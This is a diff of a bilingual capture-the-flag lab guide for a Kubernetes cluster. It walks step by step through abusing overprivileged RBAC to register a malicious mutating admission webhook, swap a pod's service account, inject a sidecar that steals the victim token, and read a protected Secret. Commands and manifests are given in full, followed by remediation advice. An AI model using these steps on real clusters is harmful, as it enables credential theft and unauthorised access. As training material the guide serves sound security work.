@@ -1,79 +1,116 @@
-# K8S-25: Mutating Webhook Sidecar Injection
+# K8S-25: MutatingWebhookConfiguration Overprivileged Registration
 
 ## 场景信息
 
 | 字段 | 值 |
 |---|---|
 | ID | K8S-25 |
-| 名称 | Mutating Webhook Sidecar Injection |
-| 技术/CVE | N/A (admission control abuse) |
+| 名称 | MutatingWebhookConfiguration Overprivileged Registration |
+| 技术/CVE | N/A (admission control abuse via overprivileged RBAC) |
 | 难度 | L2 |
 | 交付方式 | KIND / Kubernetes |
 | 入口 | KIND 集群内入口（无固定宿主端口） |
 
 ## 场景概述
-- 技术：N/A (admission control abuse)
+- 技术：滥用"可注册 MutatingWebhookConfiguration"的越权 RBAC，注入恶意 sidecar
 - 难度：L2
 - 交付方式：k8s
+
 ## 攻击路径与利用步骤
 
 ## Overview
 | Property | Value |
 |----------|-------|
-| CVE | N/A (admission control abuse) |
+| CVE/Technique | N/A -- overprivileged RBAC (create mutatingwebhookconfigurations) |
 | Difficulty | L2 |
-| Type | k8s |
+| Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-25-webhook-inject |
-| Attack Vector | Mutating admission webhook injects malicious sidecar → token theft |
+| Flag Location | Secret `vault-flag` in namespace `target-ns` |
 
-## Attack Path
+## Attack Path Summary
+1. Attacker SA `attacker-sa` is overprivileged: it can create `MutatingWebhookConfiguration` objects cluster-wide
+2. A webhook server (attacker-controlled, self-signed TLS) is pre-deployed in `attacker-ns`
+3. The attacker registers a mutating webhook whose `namespaceSelector` targets `attacker-ns`
+4. Any pod created in `attacker-ns` is mutated: `serviceAccountName` is patched to `victim-sa` and a sidecar is injected
+5. The sidecar writes the (victim-sa) SA token to `/tmp/token.txt`
+6. The attacker reads the token, then uses it to read `vault-flag` in `target-ns` (the only permission `victim-sa` has)
 
-```
-Attacker discovers mutating webhook → Webhook injects sidecar into new pods
-  → Sidecar reads SA token from injected pods → Use token to read flag Secret
-```
+## Prerequisites
+- kubectl access to KIND cluster `cve-k8s-25-webhook-inject`
+- Pod name: `attacker-pod` in `attacker-ns` (bitnami/kubectl, uses `attacker-sa`)
 
 ## Step-by-Step Exploitation
 
-### Step 1: Discover the Mutating Webhook
-
+### Step 1: Get the Attacker SA Token
 ```bash
-kubectl get mutatingwebhookconfigurations
-# OR check pod annotations for injected sidecars
-kubectl describe pod -n target-ns -l app=target-app
-# Note: injected-sidecar container added by webhook
+kubectl exec -n attacker-ns attacker-pod -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token
+# Save it and verify the overprivileged role:
+TOKEN=<attacker-sa-token>
+kubectl --token=$TOKEN auth can-i create mutatingwebhookconfigurations
+# Expected: yes
 ```
 
-### Step 2: Create a New Pod to Trigger Sidecar Injection
-
+### Step 2: Retrieve the Webhook Server CA
 ```bash
-kubectl run trigger-pod --image=nginx:1.24-alpine -n target-ns -- sleep 3600
-# The mutating webhook injects a sidecar automatically
+# The webhook server generated its own CA at startup and placed it in /shared
+CA_B64=$(kubectl exec -n attacker-ns deploy/mutating-webhook -- \
+  cat /shared/ca.crt | base64 -w0)
 ```
 
-### Step 3: Examine Injected Sidecar
-
+### Step 3: Register the Malicious MutatingWebhook
 ```bash
-kubectl get pod trigger-pod -n target-ns -o yaml | grep -A20 injected-sidecar
-# The sidecar reads the pod's SA token into /sidecar.log
-kubectl exec -n target-ns trigger-pod -c injected-sidecar -- cat /sidecar.log
+kubectl --token=$TOKEN apply -f - << EOF
+apiVersion: admissionregistration.k8s.io/v1
+kind: MutatingWebhookConfiguration
+metadata:
+  name: sidecar-injector
+webhooks:
+  - name: sidecar-injector.attacker-ns.svc
+    clientConfig:
+      url: "https://mutating-webhook.attacker-ns.svc:443/mutate"
+      caBundle: ${CA_B64}
+    rules:
+      - operations: ["CREATE"]
+        apiGroups: [""]
+        apiVersions: ["v1"]
+        resources: ["pods"]
+    namespaceSelector:
+      matchLabels:
+        kubernetes.io/metadata.name: attacker-ns
+    failurePolicy: Ignore
+    sideEffects: None
+    admissionReviewVersions: ["v1"]
+EOF
 ```
 
-### Step 4: Use SA Token to Read Flag Secret
-
+### Step 4: Create a Trigger Pod
 ```bash
-# Get the SA token from the injected sidecar's log
-TOKEN=$(kubectl exec -n target-ns trigger-pod -c injected-sidecar -- \
-  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+kubectl --token=$TOKEN run trigger-pod --image=nginx:1.24-alpine -n attacker-ns \
+  -- sleep 3600
+kubectl --token=$TOKEN wait --for=condition=Ready pod/trigger-pod -n attacker-ns --timeout=60s
 
-# Read the flag Secret
-kubectl get secret vault-flag -n target-ns -o jsonpath='{.data.flag}' | base64 -d
+# Verify the mutation: serviceAccountName=victim-sa and injected-sidecar present
+kubectl --token=$TOKEN get pod trigger-pod -n attacker-ns -o yaml | grep -E "serviceAccountName|injected-sidecar"
+```
+
+### Step 5: Steal the Victim SA Token
+```bash
+VICTIM_TOKEN=$(kubectl --token=$TOKEN exec trigger-pod -n attacker-ns -c injected-sidecar -- \
+  cat /tmp/token.txt)
+echo "$VICTIM_TOKEN"
+```
+
+### Step 6: Read the Flag Secret
+```bash
+curl -sk -H "Authorization: Bearer $VICTIM_TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/target-ns/secrets/vault-flag | \
+  python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']['flag']).decode())"
 # Output: flag{k8s-25-<16-hex>}
 ```
 
 ## Flag Location
-- **Primary**: Secret `vault-flag` in `target-ns` namespace
-- **Hint**: ConfigMap `app-config` in `target-ns` has `flag_hint` key
+- **Primary**: Secret `vault-flag` in namespace `target-ns`
 - **Format**: `flag{k8s-25-<16-hex>}`
 
 ## Verification
@@ -87,11 +124,13 @@ bash teardown.sh
 
 | 规划维度 | 所需知识 |
 |---|---|
-| 环境与访问 | Admission webhooks, TLS, and pod mutation |
-| 侦察与前置条件 | MutatingWebhookConfiguration scope and trusted namespace targets |
-| 核心漏洞与利用 | Register or control a mutating webhook to inject a sidecar |
-| 权限、横向或影响 | Workload credential interception/execution |
-| 验证 | Use the injected sidecar to retrieve the flag |
+| 环境与访问 | Admission webhooks, TLS/caBundle, ServiceAccounts and RBAC |
+| 侦察与前置条件 | MutatingWebhookConfiguration registration rights and webhook discovery |
+| 核心漏洞与利用 | Register a malicious mutating webhook to inject a sidecar and swap the pod SA |
+| 权限、横向或影响 | Workload credential theft and cross-namespace access |
+| 验证 | Use the stolen victim-sa token to read the protected Secret |
 
 ## 修复建议
-升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
+将 `mutatingwebhookconfigurations` 的创建权限限制给受控的集群管理员，不允许
+普通平台运维/租户角色持有；对 admission webhook 的注册增加审计与告警；用
+Pod Security Admission / OPA 策略限制 sidecar 注入与 `serviceAccountName` 篡改。
